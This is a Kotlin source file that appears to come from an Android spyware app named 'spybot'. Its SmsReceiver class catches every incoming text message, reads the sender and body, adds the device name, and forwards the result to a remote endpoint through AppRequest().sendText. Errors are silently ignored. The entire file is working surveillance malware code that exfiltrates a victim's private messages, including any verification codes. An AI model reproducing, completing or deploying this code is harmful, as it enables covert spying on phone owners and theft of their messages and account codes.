package com.spybot.app.Receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import com.spybot.app.Utils.AppTools
import com.spybot.app.Utils.AppPermission
import com.spybot.app.Utils.AppRequest

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return
        if (!AppPermission(context).checkReadSms()) return

        val bundle = intent.extras ?: return
        try {
            val pdus = bundle["pdus"] as? Array<*> ?: return
            for (pdu in pdus) {
                val msg = SmsMessage.createFromPdu(pdu as ByteArray)
                val text = "New SMS\nDevice: ${AppTools.getDeviceName()}\nFrom: ${msg.originatingAddress}\nMessage: ${msg.messageBody}"
                AppRequest().sendText(AppRequest.Text(text))
            }
        } catch (e: Exception) {}
    }
}
